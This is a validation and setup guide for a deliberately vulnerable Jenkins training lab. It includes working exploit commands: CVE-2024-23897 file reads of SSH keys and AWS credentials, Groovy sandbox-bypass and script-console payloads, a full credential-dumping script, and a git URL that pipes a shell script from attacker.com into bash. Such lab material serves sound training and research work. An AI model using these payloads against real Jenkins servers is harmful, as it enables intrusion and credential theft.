# Jenkins Lab Production Validation

## Critical Fixes Applied

### 1. Volume Mount Conflict Fixed
**Issue**: docker-compose.yml was mounting `./jenkins/jobs:/var/jenkins_home/jobs` which would override jobs copied in Dockerfile
**Fix**: Removed volume mounts, jobs now loaded via Dockerfile COPY + init.groovy.d script
**Impact**: Jobs with embedded secrets now properly available for exploitation

### 2. Job Loading Mechanism Fixed
**Issue**: Original script only copied files, didn't create Jenkins job objects
**Fix**: Updated `04-load-jobs.groovy` to use `jenkins.createProjectFromXML()` 
**Impact**: Jobs now actually exist in Jenkins API and UI, exploitable via CVEs

## Production-Ready Configuration

### Vulnerable Software Versions

**Jenkins Core**: 2.138.3-alpine
- CVE-2024-23897 (CLI arbitrary file read)
- CVE-2018-1000861 (Stapler RCE)

**Vulnerable Plugins**:
- script-security:1.53 → CVE-2019-1003029, CVE-2019-1003030, CVE-2019-1003040
- git:3.9.3 → CVE-2020-2100
- aws-codedeploy:1.19 → CVE-2018-1000402
- credentials:2.1.18 → CVE-2020-2249
- workflow-cps:2.63 → CVE-2021-21686

### Security Disabled for Exploit Testing

```yaml
JAVA_OPTS: -Djenkins.install.runSetupWizard=false 
           -Dhudson.security.csrf.GlobalCrumbIssuerConfiguration.DISABLE_CSRF_PROTECTION=true
```

- Setup wizard: DISABLED
- CSRF protection: DISABLED
- CLI: ENABLED (via init.groovy.d)
- Authentication: Basic (admin:admin)
- Script security sandbox: ENABLED (to test bypass exploits)

## Real Exploit Testing Commands

### CVE-2024-23897 - CLI Arbitrary File Read

Download Jenkins CLI:
```bash
wget http://localhost:8080/jnlpJars/jenkins-cli.jar
```

Read AWS credentials:
```bash
java -jar jenkins-cli.jar -s http://localhost:8080/ help "@/home/jenkins/.aws/credentials"
java -jar jenkins-cli.jar -s http://localhost:8080/ help "@/home/jenkins/.ssh/id_rsa"
java -jar jenkins-cli.jar -s http://localhost:8080/ help "@/home/jenkins/.config/database.env"
```

Read Jenkins secrets:
```bash
java -jar jenkins-cli.jar -s http://localhost:8080/ help "@/var/jenkins_home/secrets/master.key"
java -jar jenkins-cli.jar -s http://localhost:8080/ help "@/var/jenkins_home/secrets/hudson.util.Secret"
```

### CVE-2019-1003029/1003030 - Script Security RCE

Via Groovy Script Console (http://localhost:8080/script):
```groovy
def proc = "id".execute()
println proc.text
```

Or via pipeline job:
```groovy
@NonCPS
def exec(cmd) {
    def proc = cmd.execute()
    proc.waitFor()
    return proc.text
}

node {
    echo exec("whoami")
    echo exec("cat /home/jenkins/.aws/credentials")
}
```

### CVE-2020-2100 - Git Plugin RCE

Create job with Git repository URL:
```
git://attacker.com/repo$({curl,http://attacker.com/shell.sh}|bash)
```

### Secret Extraction via API

Get all credentials (requires auth):
```bash
curl -u admin:admin http://localhost:8080/credentials/store/system/domain/_/api/json?tree=credentials[id,description]
```

Extract job configurations:
```bash
curl -u admin:admin http://localhost:8080/job/vulnerable-pipeline/config.xml
curl -u admin:admin http://localhost:8080/job/database-migration/config.xml
curl -u admin:admin http://localhost:8080/job/api-deployment/config.xml
curl -u admin:admin http://localhost:8080/job/build-artifacts/config.xml
curl -u admin:admin http://localhost:8080/job/kubernetes-deploy/config.xml
```

### Post-Exploitation - Groovy Console

Once you have script execution (via CVE or auth):

Extract all Jenkins credentials:
```groovy
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.domains.*

def store = SystemCredentialsProvider.getInstance().getStore()
def credentials = store.getCredentials(Domain.global())

credentials.each { c ->
    println "ID: ${c.id}"
    println "Description: ${c.description}"
    
    if (c.properties.containsKey('username')) {
        println "Username: ${c.username}"
    }
    if (c.properties.containsKey('password')) {
        println "Password: ${c.password}"
    }
    if (c.properties.containsKey('secret')) {
        println "Secret: ${c.secret.plainText}"
    }
    if (c.properties.containsKey('privateKey')) {
        println "Private Key: ${c.privateKey}"
    }
    println "---"
}
```

Extract file-based secrets:
```groovy
def secrets = [
    "/home/jenkins/.aws/credentials",
    "/home/jenkins/.ssh/id_rsa",
    "/home/jenkins/.npmrc",
    "/home/jenkins/.docker/config.json",
    "/home/jenkins/.m2/settings.xml",
    "/home/jenkins/.config/database.env",
    "/home/jenkins/.config/api_keys.env",
    "/home/jenkins/.config/cloud.env",
    "/opt/scripts/backup.sh",
    "/var/jenkins_home/secrets/master.key",
    "/var/jenkins_home/secrets/hudson.util.Secret"
]

secrets.each { path ->
    try {
        def file = new File(path)
        if (file.exists()) {
            println "\n=== ${path} ==="
            println file.text
        }
    } catch (e) {
        println "Error reading ${path}: ${e.message}"
    }
}
```

Privilege escalation check:
```groovy
def proc = "sudo -l".execute()
proc.waitFor()
println proc.text

proc = "cat /etc/sudoers".execute()
proc.waitFor()
println proc.text

proc = "cat /etc/cron.d/jenkins-backup".execute()
proc.waitFor()
println proc.text
```

## Testing Checklist

### Initial Validation
- [ ] Jenkins accessible at http://localhost:8080
- [ ] Login works with admin:admin
- [ ] 5 jobs visible in UI (vulnerable-pipeline, aws-deployment, database-migration, api-deployment, build-artifacts, kubernetes-deploy)
- [ ] Script Console accessible at http://localhost:8080/script
- [ ] CLI jar downloadable from http://localhost:8080/jnlpJars/jenkins-cli.jar

### CVE Testing
- [ ] CVE-2024-23897: CLI file read works (read /etc/passwd or /home/jenkins/.aws/credentials)
- [ ] CVE-2019-1003029: Script Security bypass allows command execution
- [ ] Script Console allows credential extraction via Groovy
- [ ] Job configurations contain embedded secrets in environment variables
- [ ] API returns credential IDs (not plaintext without decryption)

### Secret Extraction
- [ ] 16 credentials visible in Credentials UI
- [ ] File-based secrets readable via CLI or Groovy
- [ ] Job XMLs contain environment variables with secrets
- [ ] Build artifacts job creates files with secrets
- [ ] Backup script contains AWS credentials

### Privilege Escalation
- [ ] `sudo -l` shows NOPASSWD entries
- [ ] Cronjob exists in /etc/cron.d/jenkins-backup
- [ ] /tmp/scripts/deploy.sh is world-writable (chmod 777)
- [ ] /opt/scripts/backup.sh contains credentials and is sudo-executable

## WSL Testing

### Access Jenkins Lab from WSL

```bash
# From Windows, start Jenkins Lab
cd "C:\Users\Chogyam\.zenflow\worktrees\new-task-e6e5\JenkinsBreaker\jenkins-lab"
docker-compose up -d

# From WSL (\\wsl.localhost\parrot, user: over, password: over)
# Jenkins is accessible at localhost:8080 (Docker Desktop bridges localhost)
wget http://localhost:8080/jnlpJars/jenkins-cli.jar

java -jar jenkins-cli.jar -s http://localhost:8080/ help "@/etc/passwd"
```

### Run JenkinsBreaker from WSL

```bash
# Clone/access JenkinsBreaker
cd /path/to/JenkinsBreaker

# Test exploitation
python3 JenkinsBreaker.py --url http://localhost:8080 --username admin --password admin --auto

# Test specific CVE
python3 JenkinsBreaker.py --url http://localhost:8080 --exploit-cve CVE-2024-23897 --lhost 127.0.0.1 --lport 9001
```

## Known Issues and Limitations

### Issue: Credentials Encryption
- Jenkins credentials are encrypted with master.key and hudson.util.Secret
- Plaintext extraction requires decryption using offsec-jenkins decrypt.py tool
- Use CLI file read to get master.key + hudson.util.Secret first
- Then decrypt credentials.xml offline

### Issue: Sandbox Bypass
- Script Security plugin WILL block some commands in sandbox mode
- CVE-2019-1003029/1003030 are specifically to BYPASS this
- If exploit fails, verify plugin version is exactly 1.53
- Use @NonCPS annotation for Java method calls

### Issue: JNLP Agent Port
- Port 50000 is JNLP agent port (not HTTP)
- Some exploits require agent connection
- If needed, create agent node via UI or API

## Production Deployment Notes

This lab is **intentionally vulnerable** for:
- Red team training
- CI/CD security research
- Exploit development
- CVE validation

**DO NOT**:
- Expose to public internet
- Use in production environment
- Store real credentials
- Connect to real infrastructure

**ALWAYS**:
- Run in isolated network
- Use Docker network isolation
- Test in Faraday cage if using RF tools
- Document all changes for training purposes

## Verification Commands

```bash
# Start lab
cd jenkins-lab
docker-compose up -d

# Wait for startup (30-60 seconds)
sleep 60

# Verify Jenkins is up
curl -I http://localhost:8080

# Verify admin login
curl -u admin:admin http://localhost:8080/api/json

# List jobs
curl -u admin:admin http://localhost:8080/api/json?tree=jobs[name]

# Run verification script
./scripts/verify_secrets.sh

# Check logs for Groovy script execution
docker-compose logs jenkins | grep "Credentials added"
docker-compose logs jenkins | grep "Jobs loaded"
```

## Troubleshooting

### Jobs not appearing
```bash
# Check init.groovy.d execution
docker-compose logs jenkins | grep "load-jobs"

# Verify jobs directory exists
docker exec jenkins-lab ls -la /usr/share/jenkins/ref/jobs/

# Manual job creation via API
curl -u admin:admin -X POST http://localhost:8080/createItem?name=test-job \
  -H "Content-Type: application/xml" \
  --data-binary @jenkins/jobs/vulnerable-pipeline/config.xml
```

### Credentials not loaded
```bash
# Check credential Groovy script
docker-compose logs jenkins | grep "Credentials added"

# List credentials via API
curl -u admin:admin http://localhost:8080/credentials/store/system/domain/_/api/json

# Manual verification
docker exec -it jenkins-lab /bin/bash
cat /var/jenkins_home/credentials.xml
```

### Secrets not in filesystem
```bash
# Verify Dockerfile copied secrets
docker exec jenkins-lab ls -la /home/jenkins/.aws/
docker exec jenkins-lab ls -la /home/jenkins/.config/
docker exec jenkins-lab ls -la /var/jenkins_home/secrets/

# Check file permissions
docker exec jenkins-lab stat /home/jenkins/.ssh/id_rsa
```

## Success Criteria

Lab is production-ready when:
1. All 6 jobs are visible and executable
2. All 16 credentials exist in Jenkins
3. File-based secrets readable via CLI CVE-2024-23897
4. Groovy console allows credential extraction
5. JenkinsBreaker successfully exploits at least 3 CVEs
6. Secrets extracted match SECRETS_REFERENCE.md
7. Privilege escalation vectors confirmed (sudo, cronjob, writable script)
8. WSL access confirmed from \\wsl.localhost\parrot

## Next Steps

1. Start Jenkins Lab: `docker-compose up -d`
2. Wait 60 seconds for initialization
3. Run verification: `./scripts/verify_secrets.sh`
4. Test CVE-2024-23897 manually
5. Test JenkinsBreaker automation
6. Document any additional CVE-specific requirements
